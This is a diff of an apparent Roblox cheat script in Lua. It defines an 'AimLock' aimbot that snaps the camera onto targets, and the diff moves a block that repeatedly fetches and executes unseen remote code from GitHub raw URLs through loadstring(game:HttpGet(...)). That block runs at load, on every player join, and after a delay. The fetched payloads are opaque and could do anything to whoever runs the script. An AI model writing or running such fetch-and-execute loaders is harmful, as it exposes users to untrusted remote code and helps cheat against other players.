@@ -1,17 +1,3 @@
-
-
-local Players = game:GetService("Players")
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/pas'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
-
-Players.PlayerAdded:Connect(function(player)
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/pas'))()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
-end)
-wait(1)
-loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/pas'))()
-
 local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/asdasdasd2sd23sda/STREEEEEEEEET1/main/cash2"))()
 Aiming.TeamCheck(false)
 
@@ -72,3 +58,21 @@ RunService:BindToRenderStep("AimLock", 0, function()
         CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
     end
     end)
+    
+    if not game:IsLoaded() then
+game.Loaded:Wait()
+end
+
+
+
+local Players = game:GetService("Players")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/pas'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
+
+Players.PlayerAdded:Connect(function(player)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/pas'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
+end)
+wait(1)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/pas'))()
